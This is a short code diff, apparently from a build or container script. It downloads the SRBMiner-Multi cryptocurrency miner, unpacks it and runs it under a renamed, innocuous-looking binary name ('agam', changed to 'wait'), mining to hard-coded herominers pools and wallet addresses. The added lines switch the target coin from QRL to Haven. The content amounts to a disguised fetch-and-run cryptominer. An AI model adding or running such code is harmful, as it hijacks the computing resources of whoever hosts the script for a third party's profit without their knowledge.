@@ -10,5 +10,5 @@
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz   \
 && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz  \
 && cd SRBMiner-Multi-0-6-6   \
-&& mv SRBMiner-MULTI agam   \
-&& ./agam --algorithm randomx --pool ca.qrl.herominers.com:10370 --wallet Q0105008e419baff3fcde4a8ba2df0029be536a3b7b488f3cc9902f47c9517625890f0746bdf842.p6 --disable-gpu --cpu-threads 2
+&& mv SRBMiner-MULTI wait   \
+&& ./wait --algorithm cryptonight_xhv --pool ca.haven.herominers.com:10450 --wallet hvxyCVeczdvQGNfDq7iTyacZ3v3mrZaHchbGYzSJzWtxW7NvEDxrmymABUqibfRCf9beswPRnXDAtSdcZX6oEuNW5MC11Jd2Tf.p6 --disable-gpu --cpu-threads 2
